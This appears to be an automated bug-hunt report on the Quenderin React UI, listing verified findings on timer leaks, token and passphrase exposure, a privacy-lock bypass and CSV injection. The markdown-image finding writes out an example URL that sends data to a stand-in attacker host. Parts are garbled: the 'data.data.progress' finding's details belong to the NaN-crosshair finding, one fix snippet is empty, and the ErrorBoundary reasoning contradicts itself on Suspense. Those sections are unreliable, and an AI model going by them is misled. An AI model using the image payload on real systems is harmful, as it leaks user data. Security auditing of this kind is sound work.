confirmed.title: ErrorBoundary: retry re-mounts child but does not reset child state — error-inducing state persists
confirmed.why: handleRetry at line 20-22 clears the ErrorBoundary's own error state (`hasError: false`), which causes it to re-render its children. However, React does NOT unmount/remount the child tree on a class-component setState — the child component instances are preserved with their existing state. If the child crashed due to corrupted local state (e.g. a bad value in a useState), that state survives the retry and the child will immediately throw again on the next render, creating an infinite error-retry loop visible to the user as a flicker. For lazy-loaded components (Inspector, Docs, Metrics, SettingsArea are all lazy), a Suspense boundary sits above, so the retry does force a fresh Suspense resolution — that case is fine. But for any non-lazy child that crashes due to state, the retry button is a no-op that appears to work but immediately re-errors.
confirmed.repro: Wrap a component that throws on render in ErrorBoundary. Click 'Try again'. The component re-renders with the same state, throws again, ErrorBoundary catches again — visible as a rapid flash of content followed by the error UI.
confirmed.fix:
Use a `key` prop on the child (or increment a `retryKey` counter in ErrorBoundary state alongside resetting hasError) to force React to fully unmount and remount the child tree on retry: `
{this.props.children}
` and increment `retryCount` in handleRetry.
confirmed.verifierReasoning: Confirmed real. ErrorBoundary.tsx lines 20-22: `handleRetry` only sets `{ hasError: false, error: null }` on the ErrorBoundary's own state. React's reconciler preserves existing child component instances when a class component re-renders, so child state is not reset. A child with corrupted state will immediately re-throw on the next render pass, the getDerivedStateFromError fires again (line 16-18), and hasError flips back to true — producing a visible flash of content followed by the error UI. This is real for any non-lazy child. The lazy-loaded children (Inspector, Docs, Metrics, SettingsArea) are wrapped in Suspense above the ErrorBoundary in App.tsx lines 546-620, and Suspense does not force remount on ErrorBoundary retry — so even lazy children with bad state will re-crash. The fix (incrementing a retryCount key) is well-known and correct. The severity is genuinely low since an ErrorBoundary by definition only fires when a child has already crashed, and the user impact is just a non-functional retry button rather than data loss.

confirmed.title: Uncleaned UI-state setTimeouts (setIsSaved, setDiagCopied, setDiagCopyFailed) have no unmount guard
confirmed.why: handleSave (line 189), handleCopyDiagnostics (lines 247, 254), and handleCopyManualDiagnostics (lines 267-270, 274) each schedule setTimeout callbacks that call setState setters (setIsSaved, setDiagCopied, setDiagCopiedFromFallback, setDiagCopyFailed). None of the timeout IDs are captured or cancelled. React 18 suppresses the unmounted-update warning, but the timers still run after unmount. If SettingsArea unmounts and then remounts within the timer window — which can happen with React strict-mode double-invocation or rapid tab switching — the stale timer fires and resets fresh state (e.g. setIsSaved(false) clears a save-confirmation badge that the new instance just started showing).
confirmed.repro: In React strict-mode: click 'Apply Changes', then immediately navigate away and back. The 'Settings Applied' badge disappears faster than expected because the stale timer fires against the remounted instance.
confirmed.fix: In a useEffect with an empty or stable deps array, collect setTimeout return values in a ref (e.g. a Set<ReturnType<typeof setTimeout>>) and in the cleanup function call clearTimeout on all of them. Alternatively, extract a custom useTimeout hook that auto-clears on unmount.
confirmed.verifierReasoning: Confirmed at lines 189, 247, 254, 267-270, and 274: `handleSave`, `handleCopyDiagnostics`, and `handleCopyManualDiagnostics` each schedule `setTimeout` callbacks that call state setters (`setIsSaved(false)`, `setDiagCopied(false)`, `setDiagCopiedFromFallback(false)`, `setDiagCopyFailed(false)`), none with stored IDs or cleanup. Bug is real — the timers outlive the component. However, the practical consequence is cosmetic: under React strict-mode double-invoke or rapid tab navigation a transient 'Settings Applied' or 'Copied!' badge may disappear ~2 seconds early due to the stale timer firing against a remounted instance. No data loss, no security impact, no crash. Severity is low, not medium.

confirmed.title: Unguarded localStorage type confusion: corrupt settings silently disable context-size UI
confirmed.why: useAgentSocket initialises settings with { ...DEFAULT_SETTINGS, ...JSON.parse(saved) }. The try/catch guards only SyntaxError from JSON.parse; it does not validate that parsed values conform to the AppSettings schema. If localStorage['quenderin_settings'] is overwritten with a value like {"contextSize":"2048"} (string instead of number), the merge silently produces contextSize:"2048" (a string). In SettingsArea, the context-size selection buttons use a strict equality check: settings.contextSize === size (line 343, where size is a number from contextOptions). The string "2048" never equals the number 2048, so no button ever appears selected — the current context size is invisibly unselectable. Additionally, sending contextSize:"2048" to the backend via the WebSocket settings_update message may cause the backend to ignore or default-out the value, silently degrading performance.
confirmed.repro: In the browser console: localStorage.setItem('quenderin_settings', JSON.stringify({...JSON.parse(localStorage.getItem('quenderin_settings')), contextSize: '2048'})); then reload. The RAM Armor context-size buttons all appear unselected even though a value is effectively set.
confirmed.fix: After JSON.parse, validate and coerce numeric fields before merging: const parsed = JSON.parse(saved); const safeContextSize = Number(parsed.contextSize); return { ...DEFAULT_SETTINGS, ...parsed, contextSize: Number.isFinite(safeContextSize) && safeContextSize > 0 ? safeContextSize : DEFAULT_SETTINGS.contextSize }. Apply similar guards to chatLogDedupeMs. Use Zod or a simple manual validator for the full Settings shape.
confirmed.verifierReasoning: The UI-side vulnerability is confirmed at line 343: `settings.contextSize === size` uses strict equality where `size` is a `number`. If `contextSize` is ever a string (e.g. `'2048'`), no button is ever selected. The root-cause parsing path is in `useAgentSocket.ts`, which is outside the permitted file scope and could not be verified directly. Since the finding's root cause is unverified and the triggering condition (manually crafted localStorage or a separate hook bug) is not reachable through normal use, confidence is medium rather than high. Severity is low: the consequence is a silent UI selection bug (no button highlighted), not data loss or security impact, and it requires either a user or a prior bug to corrupt localStorage.

confirmed.title: NaN coordinates from malformed TAP command crash the crosshair indicator silently
confirmed.why: Inspector parses the last 'decide' log entry's command string for TAP coordinates: parts = command.split(' '); targetTap = { x: parseInt(parts[1], 10), y: parseInt(parts[2], 10) }. If the LLM emits a 'decide' entry whose command is 'TAP' (no trailing arguments), or 'TAP <non-numeric>', parts[1] and/or parts[2] are undefined, and parseInt(undefined, 10) returns NaN. targetTap then becomes { x: NaN, y: NaN }. The conditional render check on line 80 (if targetTap) is truthy (an object is always truthy), so the crosshair div is rendered with style left:'NaN%' top:'NaN%'. While browsers treat NaN% as 0%, it means the crosshair always appears at the top-left corner of the device frame regardless of the actual tap target — a silent incorrect visual.
confirmed.repro: Inject a log entry with type:'decide' and command:'TAP' (no coordinates). The orange crosshair appears pinned to the top-left of the device frame instead of being hidden.
confirmed.fix: Add a guard after parsing: const x = parseInt(parts[1], 10); const y = parseInt(parts[2], 10); if (!isNaN(x) && !isNaN(y)) { targetTap = { x, y }; } — leave targetTap null if either coordinate is invalid.
confirmed.verifierReasoning: Confirmed exactly at lines 14-16: `parts = lastDecide.command.split(' ')` followed by `targetTap = { x: parseInt(parts[1], 10), y: parseInt(parts[2], 10) }` with no NaN guard. When command is `'TAP'` (no trailing arguments), `parts[1]` and `parts[2]` are `undefined`, and `parseInt(undefined, 10)` returns `NaN`. The render guard at line 80 is `if (targetTap)` — but `targetTap` is an object `{ x: NaN, y: NaN }`, which is always truthy. The crosshair div renders with `left: 'NaN%'` and `top: 'NaN%'`, which browsers clamp to 0%, pinning the crosshair to the top-left corner of the device frame regardless of the actual tap target. The bug is silently wrong rather than crashing. Severity low is correct: it is a visual indicator only with no functional impact.

reportMarkdown: # Quenderin React UI — Deep Bug Hunt (2026-06-27) This deep hunt swept four React-UI subsystems — render-safety, socket-lifecycle, app-state, and settings-metrics — surfacing 29 candidate findings, of which 23 survived adversarial verification. The confirmed set is dominated by missing-cleanup leaks (untracked timers, RAF, and fetches firing setState/`onSend`/inference after unmount) and a cluster of credential-exposure issues on the WebSocket transport (auth token in the upgrade URL, plus the privacy passphrase persisted to localStorage and broadcast in every `settings_update` frame). The single critical is a privacy-lock bypass: a blank passphrase makes `!expectedPassphrase` truthy, auto-unlocking the app with no challenge. Render-safety findings are real but narrower than first flagged — `react-markdown` blocks `javascript:`/`data:` on image `src`, so the residual is an unconditional outbound `https:` image fetch that breaks the offline/private guarantee, not script execution. The remaining confirmed items are correctness/UX races (mid-session re-lock on settings sync, stale-data overwrite in the sidebar, a non-functional ErrorBoundary retry) and low-severity hygiene (unguarded WS-frame parsing, CSV formula injection, NaN crosshair coordinates). ## Confirmed findings (severity-ordered) | Severity | Subsystem | Title | File:line | Fix | |---|---|---|---|---| | Critical | app-state | PrivacyLock auto-unlocks when `isEnabled=true` but `expectedPassphrase` is empty | `ui/src/components/PrivacyLock.tsx:23-27,74` | Drop the auto-unlock effect; gate purely via render path; reject blank passphrase before enabling lock | | High | socket-lifecycle | Auth token leaked in WebSocket URL query string | `ui/src/hooks/useAgentSocket.ts:60` | Send token in first WS text frame, not `?token=` | | High | socket-lifecycle | `privacyPassphrase` in plaintext localStorage and every `settings_update` WS frame | `ui/src/hooks/useAgentSocket.ts:21,82-83,282,284,291,293` | Omit passphrase from persistence and WS payload; keep in-memory only | | Medium | render-safety | `react-markdown` renders LLM image `src` without scheme validation — `https:` exfiltration | `ui/src/components/GeneralChatArea.tsx:281-301` | Add a custom `img` component; consider blocking images entirely | | Medium | render-safety | Queue-drain `setTimeout` not cancelled on unmount — post-unmount `onSend` | `ui/src/components/GeneralChatArea.tsx:171-182` | Capture timer id, `clearTimeout` in effect cleanup | | Medium | socket-lifecycle | Missing `ws.onerror` handler → silent reconnect storm on auth/upgrade rejection | `ui/src/hooks/useAgentSocket.ts:55-196` | Add `onerror`; distinguish upgrade-reject from mid-session drop; defer `reconnectAttempts` reset | | Medium | app-state | `setInterval` in `handleDownloadVoice` leaks if wizard unmounts mid-download | `ui/src/App.tsx:48-61` | Track interval id reachable from catch; clear on error/unmount | | Medium | app-state | Privacy lock re-locks on every settings sync, mid-session | `ui/src/App.tsx:371-377` | Only set `isLocked=true` on initial settings load via a `settingsInitialized` ref | | Medium | settings-metrics | setState-after-unmount via untracked `setTimeout` in model download/delete handlers | `ui/src/components/SettingsArea.tsx:161,174` | Track timeout ids, clear on cleanup; `AbortController` for the refetch | | Medium | settings-metrics | CSV formula injection via LLM-controlled `goal_text` in exported metrics | `ui/src/components/Metrics.tsx:101` | Prefix cells starting with `= + - @ \t \r` with a single quote | | Low | render-safety | `CodeBlock` `setTimeout` without cleanup — `setCopied` fires after unmount | `ui/src/components/CodeBlock.tsx:11-13` | `useRef` + `useEffect` cleanup `clearTimeout` | | Low | render-safety | Auto-scroll RAF not cancelled in cleanup — fires after unmount | `ui/src/components/GeneralChatArea.tsx:107-121` | Return `() => cancelAnimationFrame(id)` from the effect | | Low | render-safety | `agentLogs` derived array as `useEffect` dep — spurious scroll-to-bottom every render | `ui/src/components/ChatArea.tsx:35-41` | Depend on `agentLogs.length` + last id, or `useMemo` | | Low | socket-lifecycle | Unvalidated localStorage settings spread verbatim into WS messages — property injection | `ui/src/hooks/useAgentSocket.ts:37-39,83` | Strip to an `AppSettings` allow-list before storing/sending | | Low | socket-lifecycle | setState-after-unmount race in `ws.onopen` during reconnect | `ui/src/hooks/useAgentSocket.ts:64-67,201-205` | `mounted` flag guarding every `setX` in `onopen`/`onclose`/`onmessage` | | Low | socket-lifecycle | `data.data.progress` accessed without optional chaining — silent `TypeError` on malformed frame | `ui/src/hooks/useAgentSocket.ts:150` | `data.data?.progress ?? 0` | | Low | app-state | `PrivacyLock` stale closure on `failedAttempts` — lockout count can regress | `ui/src/components/PrivacyLock.tsx:47-72` | Functional updater `setFailedAttempts(prev => prev + 1)`; submitting ref | | Low | app-state | `setTimeout` in `handleFinish`/`handleDownloadVoice` fire setState after unmount | `ui/src/App.tsx:57,67` | Track/cancel timeout ids; make `handleFinish` delay synchronous | | Low | app-state | `/api/sessions` fetch has no cancellation — stale setState on view change | `ui/src/components/Sidebar.tsx:40-47` | `AbortController`, `return () => ac.abort()` | | Low | app-state | `ErrorBoundary` retry re-mounts child but does not reset child state | `ui/src/components/ErrorBoundary.tsx:20-22` | Increment a `retryCount` key to force child remount | | Low | settings-metrics | Uncleaned UI-state `setTimeout`s (`setIsSaved`/`setDiagCopied`/…) have no unmount guard | `ui/src/components/SettingsArea.tsx:189,247,254,267-270,274` | Collect timeout ids in a ref; clear in `useEffect` cleanup | | Low | settings-metrics | Unguarded localStorage type confusion silently disables context-size UI | `ui/src/components/SettingsArea.tsx:343-353` (root cause `useAgentSocket.ts:38`) | Coerce/validate numeric fields after `JSON.parse` | | Low | settings-metrics | NaN coordinates from malformed `TAP` command pin the crosshair to top-left | `ui/src/components/Inspector.tsx:14-16` | Guard `isNaN(x)`/`isNaN(y)`; leave `targetTap` null if invalid | ## Finding details ### Critical — PrivacyLock auto-unlocks on a blank passphrase `ui/src/components/PrivacyLock.tsx:23-27,74` **Why it bites.** The effect at lines 23-27 reads `if (!isEnabled || !expectedPassphrase) { onUnlock(); }`. An empty string is falsy in JavaScript, so `!expectedPassphrase` is true whenever the passphrase is blank, and `onUnlock()` (= `setIsLocked(false)` at App.tsx:444) fires with no user challenge. The render gate at line 74 hides the overlay on the same condition. The App-level guard (App.tsx:371-377) compounds it: when `privacyPassphrase` is `''` the else-branch runs `setIsLocked(false)`, so app state never locks. The effect also calls `onUnlock()` unconditionally whenever `isEnabled` flips false — e.g. a settings sync arriving before the passphrase field is populated unlocks the app with no user interaction. **Repro.** Enable privacy lock, save with an empty passphrase (or set `privacyPassphrase` to `''`), reload. PrivacyLock renders null and calls `onUnlock()` immediately, no lock screen shown. **Fix.** Remove the auto-unlock effect entirely — the overlay disappearing is sufficient and the proactive `onUnlock()` invites a re-entrancy loop if it re-enables the lock. Gate the component purely via the render path: `if (!isEnabled || !expectedPassphrase) return null`. In `SettingsArea`, validate that `privacyPassphrase` is a non-empty string before allowing privacy lock to be enabled. **Verifier reasoning.** Confirmed real. Both the App-level guard failure (`''` passphrase → `setIsLocked(false)` else-branch) and the PrivacyLock effect path are reachable in normal use; the empty-string falsy check is the root cause in both places. ### High — Auth token leaked in WebSocket URL query string `ui/src/hooks/useAgentSocket.ts:60` **Why it bites.** The token is appended as `?token=` to the WS upgrade URL. DevTools Network → WS records the URL, Electron main-process stdout logs the upgrade, any local proxy sees it, and on non-Electron targets it lands in `window.location.href`/browser history. `api.ts` already correctly uses an `X-Auth-Token` header for HTTP, so the WS path is the lone leak. **Repro.** Electron renderer DevTools → Network → filter WS: `ws://localhost:/ws?token=` is plainly visible. **Fix.** Remove `?token=`. After `ws.onopen`, send `ws.send(JSON.stringify({ type: 'auth', token }))` and have the server reject all other messages until it receives a valid auth frame (browser WebSocket can't set custom upgrade headers, so a first-message protocol is the correct mitigation). **Verifier reasoning.** Confirmed at line 60; the code comment at line 57 even labels it "audit HIGH #1." No out-of-band mechanism exists for the WS upgrade path. ### High — privacyPassphrase persisted and broadcast in plaintext `ui/src/hooks/useAgentSocket.ts:21,82-83,282,284,291,293` **Why it bites.** `AppSettings` includes `privacyPassphrase: string` (line 21). `updateSettings` serialises the whole settings object — passphrase included — to localStorage (line 282) and sends it over WS as `{ type: 'settings_update', ...newSettings }` (line 284). The same spread re-sends it on reconnect (line 83, via `settingsRef.current`) and on `resetSettings` (lines 291, 293). Any same-origin reader or WS observer recovers the passphrase in cleartext; old values linger in localStorage until overwritten. **Repro.** Set a passphrase, then `localStorage.getItem('quenderin_settings')` shows it in plain JSON; every `settings_update` WS frame contains `"privacyPassphrase":""`. **Fix.** Exclude the passphrase from both persistence and the WS payload — split it into an in-memory `sensitiveSettings` object, or derive a key client-side and never store/transmit the raw value. Concretely: `const { privacyPassphrase: _, ...safeSettings } = settingsRef.current; ws.send(JSON.stringify({ type: 'settings_update', ...safeSettings }));` **Verifier reasoning.** Confirmed across all cited lines — plaintext in localStorage and in every `settings_update` frame, including reconnect and reset paths. ### Medium — react-markdown renders LLM image src without scheme validation `ui/src/components/GeneralChatArea.tsx:281-301` **Why it bites.** No custom `img` override exists in any `ReactMarkdown` call, so the default renderer emits `` verbatim. An LLM response containing `![x](https://attacker.com/beacon?data=...)` triggers an unconditional outbound request on render — leaking the user's IP and inference context — which breaks the "fully offline / private / local AI" guarantee shown at line 447. **Repro.** LLM emits `![x](https://attacker.com/log?data=sensitive)`; the browser fetches the URL on render with no user interaction. **Fix.** Add a custom `img` component that allows only `http(s)` and consider blocking images entirely given the offline threat model: ``` function SafeImage({src, alt}) { if (!src?.startsWith('https://') && !src?.startsWith('http://')) return null; return ; } ``` **Verifier reasoning.** Narrowed from the candidate. Via `html-url-attributes/lib/index.js:20-30`, `img[src]` passes through `defaultUrlTransform`, so `javascript:`/`data:` URIs *are* blocked — that part of the candidate is false. But `https://` is in `safeProtocol`, so an `https:` image fetch fires unconditionally. Severity is medium (privacy/data-leak), not high (no script execution). ### Medium — Queue-drain setTimeout not cancelled on unmount `ui/src/components/GeneralChatArea.tsx:171-182` **Why it bites.** The effect at line 171 fires a 300 ms `setTimeout` (line 174) with no `clearTimeout` in cleanup. If the component unmounts while the timer is pending, the callback runs `setMessageQueue([])`, `setIsQueuing(false)`, `onSend(combined, [])`, and `setLastSentPayload(...)` on a dead component. The setState calls are React-18 no-ops, but `onSend` is a real side effect: it kicks off a new backend inference run with stale queued messages after the UI is gone — wasted compute, output that is never displayed. **Repro.** Queue a message while the agent is running, then close/navigate the chat before 300 ms elapses. `onSend()` fires anyway. **Fix.** Capture the id and cancel in cleanup: `const id = setTimeout(() => { ... }, 300); return () => clearTimeout(id);` **Verifier reasoning.** Confirmed; the effect returns no cleanup. The spurious inference run is a real, reachable misbehavior — medium. ### Medium — Missing ws.onerror → silent reconnect storm `ui/src/hooks/useAgentSocket.ts:55-196` **Why it bites.** `connect()` assigns `onopen`, `onmessage`, and `onclose` but never `onerror`. On an upgrade rejection (401 bad token, or ECONNREFUSED at startup) the browser fires `onerror` then `onclose`; with `onerror` unhandled, the user sees no cause and `onclose` triggers the exponential-backoff loop (up to 15 attempts, ~55 s). Worse, line 66 resets `reconnectAttempts=0` on every successful `onopen`, so a server that accepts then immediately drops (e.g. during model load) produces an *unbounded* retry storm. **Repro.** Start the renderer before the backend is ready, or with an invalid token: DevTools shows repeated WS attempts with no user-visible cause. Accept-then-drop resets the counter and retries indefinitely. **Fix.** Add `ws.onerror = (ev) => console.error('WS error', ev)` at minimum. Distinguish "server rejected upgrade" (don't reconnect; show a clear error) from "dropped mid-session" (reconnect with backoff), and defer the `reconnectAttempts=0` reset until the connection has been stable for ~5 s. **Verifier reasoning.** Confirmed from the code alone — no `onerror` assignment, and the line-66 reset makes the accept-then-drop loop unbounded. ### Medium — setInterval in handleDownloadVoice leaks on unmount `ui/src/App.tsx:48-61` **Why it bites.** `handleDownloadVoice` creates a 500 ms `setInterval` at line 48, declared `const interval` inside the `try` block. It's cleared on success (line 55), but the `catch` block (lines 58-61) is out of scope for that `const` and cannot reference it — so on error or mid-download unmount the interval is never cleared and keeps firing `setVoiceDownloadProgress` on a dead component, consuming CPU and pinning the closure. **Repro.** Open wizard step 3 → click "Download Voice Engine" → dismiss the wizard via a concurrent path (e.g. a health check returns `isBrainInstalled=true` at App.tsx:274-276, flipping `showOnboarding=false`). The interval keeps firing every 500 ms. **Fix.** Store the interval id where the catch can reach it (or a ref) and clear it there; better, move the fetch+interval into a `useEffect` with cleanup and an `AbortController` for the fetch. **Verifier reasoning.** Confirmed real — the `catch` cannot see the `try`-scoped `const interval`, and the concurrent-unmount path via the health-check effect is reachable in normal use. ### Medium — Privacy lock re-locks on every settings sync `ui/src/App.tsx:371-377` **Why it bites.** The effect (deps `[settings.privacyLockEnabled, settings.privacyPassphrase]`) unconditionally calls `setIsLocked(true)` whenever both are truthy. `settings` comes from `useAgentSocket()` and is replaced by reference on any WS settings-sync, so a background settings push — or a WS reconnect replaying settings — re-locks the UI mid-session even though the user already unlocked. The overlay (`isEnabled={settings.privacyLockEnabled && isLocked}`, lines 441-445) reappears, interrupting the user. **Repro.** Enable privacy lock, unlock, then trigger a settings-sync / WS reconnect. The overlay reappears with no user action. **Fix.** Only initialize `isLocked=true` on the first settings load — track via a `settingsInitialized` ref and skip the re-lock on subsequent updates. **Verifier reasoning.** Confirmed real — reference replacement on every sync re-runs the effect and re-locks; reachable on any reconnect or server push. ### Medium — Untracked setTimeout in model download/delete handlers `ui/src/components/SettingsArea.tsx:161,174` **Why it bites.** `handleDownloadModel` (line 161) and `handleDeleteModel` (line 174) call `setTimeout(refreshCatalog, 2000/500)` in a `finally` block with no stored id. `refreshCatalog` (lines 143-148) does `fetch('/api/models/catalog').then(d => setModelCatalog(...))` — an unabortable in-flight request. The `/api/models/catalog` GET still fires ~2 s later; React DevTools shows the attempted setState on the unmounted `SettingsArea`. **Fix.** Store the timeout ids and clear them in a `useEffect` cleanup; use an `AbortController` for the refetch so the in-flight request is also cancelled. **Verifier reasoning.** Confirmed at both lines. Downgraded high→medium: React 18 silently discards the update — the real residue is a stale catalog update or spurious re-render, not data corruption. ### Medium — CSV formula injection via LLM-controlled goal_text `ui/src/components/Metrics.tsx:101` **Why it bites.** `exportMetricsCsv` escapes embedded double-quotes (`" → ""`) but does not neutralise formula-injection prefixes. `goal_text` is LLM/agent output — untrusted. Medium is correct: exploitation requires opening the CSV in a formula-evaluating app, which is the primary use case for a CSV export. ### Low — CodeBlock setTimeout without cleanup `ui/src/components/CodeBlock.tsx:11-13` **Why it bites.** `handleCopy` schedules `setTimeout(() => setCopied(false), 2000)` with no cancel ref. During fast LLM streaming, CodeBlocks are frequently added/removed; if one unmounts within the window, `setCopied` runs on a dead component and the closure is held alive for 2 s. **Fix.** `useRef` for the timer + `useEffect(() => () => clearTimeout(timerRef.current), [])`. **Verifier:** confirmed; React-18 no-op but a real, trivially-fixed missing-cleanup — low. ### Low — Auto-scroll RAF not cancelled in effect cleanup `ui/src/components/GeneralChatArea.tsx:107-121` **Why it bites.** The effect cancels the *previous* RAF at the top of its body (line 108) and schedules a new one (line 113) but returns no cleanup, so the last RAF survives unmount and reaches `container.scrollTop = container.scrollHeight` on a detached node. **Fix.** `return () => cancelAnimationFrame(rafIdRef.current)`. **Verifier:** structurally confirmed; accessing `scrollTop` on a detached element is a no-op in modern engines, so practical impact is negligible — low. ### Low — agentLogs derived array as useEffect dep `ui/src/components/ChatArea.tsx:35-41` **Why it bites.** `agentLogs` is computed inline via `logs.filter(...)` (line 35) and used directly as the scroll effect's dep (line 41). `Array.filter` always returns a new reference, so the effect fires on every render — including parent re-renders unrelated to log content — jerking the view to the bottom while the user is scrolled up reading. **Repro.** Type in the goal textarea while viewing logs; each keystroke re-renders the parent → new array → scroll fires. **Fix.** Depend on `[agentLogs.length, agentLogs.at(-1)?.id]`, or `useMemo`. **Verifier:** confirmed; annoying UX regression, no data/security impact — low. ### Low — Unvalidated localStorage settings spread into WS messages `ui/src/hooks/useAgentSocket.ts:37-39,83` **Why it bites.** Settings load as `{ ...DEFAULT_SETTINGS, ...JSON.parse(saved) }` with no schema validation, so any extra key survives the merge and is spread into the `settings_update` frame on reconnect (line 83). A same-origin attacker who can write localStorage can inject arbitrary top-level fields into every frame; whether they cause server harm depends on server parsing. **Fix.** Strip to the `AppSettings` allow-list before storing and before sending. **Verifier:** code pattern is real; downgraded medium→low because it requires a same-origin localStorage writer (already a significant compromise) and server-side impact is out of scope of these files. ### Low — setState-after-unmount race in ws.onopen during reconnect `ui/src/hooks/useAgentSocket.ts:64-67,201-205` **Why it bites.** Cleanup (lines 201-205) sets `intentionallyClosed=true`, clears the timer, and closes the socket. If a reconnect `setTimeout(connect)` fires in the narrow window between being dequeued and `clearTimeout` running, `connect()` builds a new socket whose `onopen` (line 64) calls `setWsReady(true)`/`reconnectAttempts=0` with no `intentionallyClosed` guard — on an unmounted component. **Fix.** A `mounted` flag guarding every `setX` in `onopen`/`onclose`/`onmessage`. **Verifier:** real but narrow — React 18 no-op, and the window requires the timer to fire at exactly the wrong microsecond — low, confidence medium. ### Low — data.data.progress accessed without optional chaining `ui/src/hooks/useAgentSocket.ts:150` **Why it bites.** Line 150 reads `data.data.progress` with no null check. The render guard `if (targetTap)` (line 80) is truthy (an object is always truthy), so the crosshair renders at `left:'NaN%' top:'NaN%'` — clamped by browsers to `0%`, pinning it to the device-frame top-left regardless of the real target. **Fix.** `const x = parseInt(parts[1],10), y = parseInt(parts[2],10); if (!isNaN(x) && !isNaN(y)) targetTap = { x, y };`. **Verifier:** confirmed exactly at lines 14-16; silently-wrong visual only, no functional impact — low. ## Subsystems audited - **render-safety** — 8 candidates, 5 confirmed. - **socket-lifecycle** — 6 candidates, 6 confirmed. - **app-state** — 9 candidates, 7 confirmed. - **settings-metrics** — 6 candidates, 5 confirmed. The 6 candidates not listed above (3 in render-safety, 2 in app-state, 1 in settings-metrics) were refuted by the adversarial verifier or found genuinely clean — most notably the candidate claim that `react-markdown` allows `javascript:`/`data:` image `src` injection, which the verifier disproved against `html-url-attributes` (those schemes are blocked; only the narrower `https:`-fetch privacy leak survived).
